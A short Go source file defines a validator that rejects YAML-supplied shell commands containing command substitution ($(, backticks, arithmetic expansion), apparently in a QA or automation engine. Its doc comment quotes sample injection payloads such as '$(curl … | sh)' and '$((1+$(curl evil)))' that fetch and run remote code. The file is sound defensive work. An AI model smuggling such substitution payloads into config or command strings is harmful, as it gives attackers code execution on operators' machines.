package engine

import (
	"fmt"
	"strings"
)

// ValidateConfigShellCommand rejects YAML-supplied shell-command strings
// that contain command-substitution patterns. The threat model is an
// operator who pastes a malicious vxd.yaml from a shared template —
// `success_criteria[].command` and `autoresearch.metric.command` flow
// straight to `sh -c`, so a `$(curl … | sh)` payload would silently
// execute on the operator's box.
//
// We deliberately allow pipes, redirects, and chains because legitimate
// QA commands use them (`go test ./... | grep PASS`). The narrower
// blocklist focuses on command substitution — the only construct that
// turns a static command string into arbitrary code execution from a
// nested expression.
//
// Rejected patterns:
//
//   - `$(` — POSIX command substitution
//   - `` ` `` — legacy backtick substitution
//   - `$((` — arithmetic expansion that can hide command substitution
//     (e.g. `$((1+$(curl evil)))`) — overly cautious but cheap to block
//
// Anything legitimate inside `$(…)` can be rewritten as an env var
// expansion or a wrapper script committed to the repo.
func ValidateConfigShellCommand(cmd string) error {
	if cmd == "" {
		return nil
	}
	patterns := []struct {
		seq, name string
	}{
		{"$(", "POSIX command substitution `$(...)`"},
		{"`", "backtick command substitution"},
		{"$((", "arithmetic expansion"},
	}
	for _, p := range patterns {
		if strings.Contains(cmd, p.seq) {
			return fmt.Errorf("config-supplied command contains %s; rewrite to avoid embedded expressions", p.name)
		}
	}
	return nil
}
